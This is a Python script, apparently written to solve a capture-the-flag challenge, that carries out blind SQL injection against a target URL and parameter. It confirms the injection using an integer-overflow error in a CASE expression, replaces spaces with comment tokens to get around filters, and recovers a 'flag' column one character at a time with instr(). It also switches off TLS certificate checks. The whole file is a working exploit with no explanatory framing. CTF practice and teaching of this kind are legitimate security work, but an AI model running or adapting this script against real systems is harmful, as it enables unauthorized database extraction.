#!/usr/bin/env python3
import requests
import string
import sys
from urllib.parse import quote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class SimpleEnumerator:
   def __init__(self, url, param):
       self.url = url
       self.param = param
       self.charset = string.hexdigits + "CBC" + '_{}'
       
   def test(self, condition):
       """Test if condition is true (no error = true, error = false)"""
       payload = f"378947762/**/AND/**/CASE/**/WHEN/**/{condition}/**/THEN/**/1/**/ELSE/**/(SELECT/**/sum(column1)/**/FROM/**/(VALUES/**/(9223372036854775807),/**/(1)))/**/END"
       encoded = quote(payload, safe='')
       url = f"{self.url}?{self.param}={encoded}"
       
       try:
           response = requests.get(url, timeout=10, verify=False)
           return 'overflow' not in response.text.lower()
       except Exception as e:
        #    print(e)
           return False
   
   def extract_string(self, base_query, max_length=100):
       """Extract string character by character using instr"""
       result = ""
       for pos in range(max_length):
           found = False
           for char in self.charset:
               # Use instr to check if string starts with current + new char
               test_string = result + char
               condition = f"instr(({base_query}),'{test_string}')=1"
               if self.test(condition):
                   result += char
                   print(f"\r{result}", end='', flush=True)
                   found = True
                   break
           if not found:
               break
       print()
       return result
   
   def get_data(self, table_name, column_name, limit=1):
       """Get data from table.column using instr"""
       print(f"[*] Extracting data from {table_name}.{column_name}...")
       data = []
       
       for offset in range(limit):
           print(f"[*] Checking row {offset}...")
           
           # Extract data using instr
           base_query = f"SELECT/**/{column_name}/**/FROM/**/{table_name}/**/LIMIT/**/1/**/OFFSET/**/{offset}"
           row_data = self.extract_string(base_query, max_length=100)
           
           if row_data:
               data.append(row_data)
               print(f"[+] Row {offset}: {row_data}")
       
       return data

def main():
   if len(sys.argv) != 3:
       print("Usage: python3 simple_enum.py <URL> <PARAM>")
       print("Example: python3 simple_enum.py http://target.com/page.php id")
       sys.exit(1)
   
   url = sys.argv[1]
   param = sys.argv[2]
   
   enum = SimpleEnumerator(url, param)
   
   # Test basic injection
   print("[*] Testing injection...")
   if enum.test("(SELECT/**/1)"):
       print("[+] Injection confirmed!")
   else:
       print("[-] Injection failed")
       sys.exit(1)
   
   enum.get_data('flag', 'nice', limit=1)

if __name__ == "__main__":
   main()